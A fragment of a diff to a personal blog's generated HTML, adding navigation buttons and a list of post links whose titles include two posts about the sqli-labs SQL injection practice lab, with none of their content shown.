+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/09/15/sqli-labs-master/" title="Next: ">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
     </div>
-    
-  </div>
-  
-</article>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/09/15/sqli-labs/">sqli-labs</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/15/sqli-labs-master/">sqli-labs-master</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/14/my-first-blog/">my first blog</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/14/hello-world/">Hello World</a></li></ul>
 
 
 
 
-
-
-
-
-
-  
-  
+    <script>
+        
+    </script>
 </div>
       <footer id="footer">
     <div class="outer">
